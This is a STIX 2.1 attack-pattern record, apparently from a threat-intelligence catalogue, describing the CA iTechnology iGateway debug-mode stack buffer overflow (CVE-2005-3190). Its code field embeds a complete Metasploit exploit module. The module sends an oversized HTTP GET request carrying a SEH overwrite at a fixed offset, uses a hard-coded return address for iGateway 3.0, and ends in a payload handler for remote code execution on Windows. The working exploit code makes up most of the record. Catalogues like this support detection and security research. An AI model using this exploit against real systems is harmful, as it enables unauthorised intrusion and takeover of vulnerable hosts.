{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5cc39d5c-5458-4e36-9bc4-8d403b60baa5",
    "created": "2024-08-14T16:54:23.318798Z",
    "modified": "2024-08-14T16:54:23.318802Z",
    "name": "CA iTechnology iGateway Debug Mode Buffer Overflow",
    "description": " This module exploits a vulnerability in the Computer Associates iTechnology iGateway component. When <Debug>True</Debug> is enabled in igateway.conf (non-default), it is possible to overwrite the stack and execute code remotely. This module works best with Ordinal payloads. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/ca_igateway_debug.rb",
            "external_id": "ca_igateway_debug.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-3190"
        },
        {
            "source_name": "reference",
            "url": "http://www.ca.com/us/securityadvisor/vulninfo/vuln.aspx?id=33485"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CA iTechnology iGateway Debug Mode Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability in the Computer Associates\n        iTechnology iGateway component. When <Debug>True</Debug> is enabled\n        in igateway.conf (non-default), it is possible to overwrite the stack\n        and execute code remotely. This module works best with Ordinal payloads.\n      },\n      'Author'         => 'aushack',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-3190' ],\n          [ 'OSVDB', '19920' ],\n          [ 'URL', 'http://www.ca.com/us/securityadvisor/vulninfo/vuln.aspx?id=33485' ],\n          [ 'EDB', '1243' ],\n          [ 'BID', '15025' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\",\n          'StackAdjustment' => -3500,\n          'Compat'   =>\n          {\n            'ConnectionType' => '+ws2ord',\n          },\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'iGateway 3.0.40621.0', { 'Ret' => 0x120bd9c4 } ], # p/p/r xerces-c_2_1_0.dll\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2005-10-06',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(5250),\n      ])\n  end\n\n  def check\n    connect\n    sock.put(\"HEAD / HTTP/1.0\\r\\nHost: #{rhost}\\r\\n\\r\\n\")\n    banner = sock.get_once\n\n    if (banner.to_s =~ /GET and POST methods are the only methods supported at this time/) # Unique?\n      return Exploit::CheckCode::Detected\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    seh = generate_seh_payload(target.ret)\n    buffer = Rex::Text.rand_text_alphanumeric(5000)\n    buffer[1082, seh.length] = seh\n    sploit = \"GET /\" + buffer + \" HTTP/1.0\"\n\n    sock.put(sploit + \"\\r\\n\\r\\n\\r\\n\")\n\n    disconnect\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-10-06",
    "x_mitre_platforms": [
        "win'"
    ]
}